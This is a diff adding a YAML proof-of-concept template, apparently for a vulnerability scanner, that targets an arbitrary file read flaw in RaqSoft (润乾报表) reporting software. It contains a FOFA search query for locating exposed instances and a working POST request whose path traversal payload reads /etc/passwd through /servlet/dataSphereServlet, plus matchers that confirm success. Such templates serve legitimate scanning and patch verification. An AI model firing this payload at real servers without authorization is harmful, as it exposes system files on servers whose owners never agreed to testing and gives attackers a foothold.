@@ -1,0 +1,18 @@
+id: poc-yaml-raqsoft-path-anyfile-read
+info:
+  name: 润乾报表 path 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 润乾报表
+  fofa: body="润乾报表" || body="/raqsoft"
+requests:
+- method: POST
+  path: /servlet/dataSphereServlet?action=11
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: path=../../../../../../../../../../../etc/passwd&content=&mode=
+  expression: status_code == 200 && contains(body,"root") && contains(body,"/bin")
+    && contains(headers,"filename=passwd") && contains(content_type,"application/x-msdownload")
+variables: {}
+transport: http
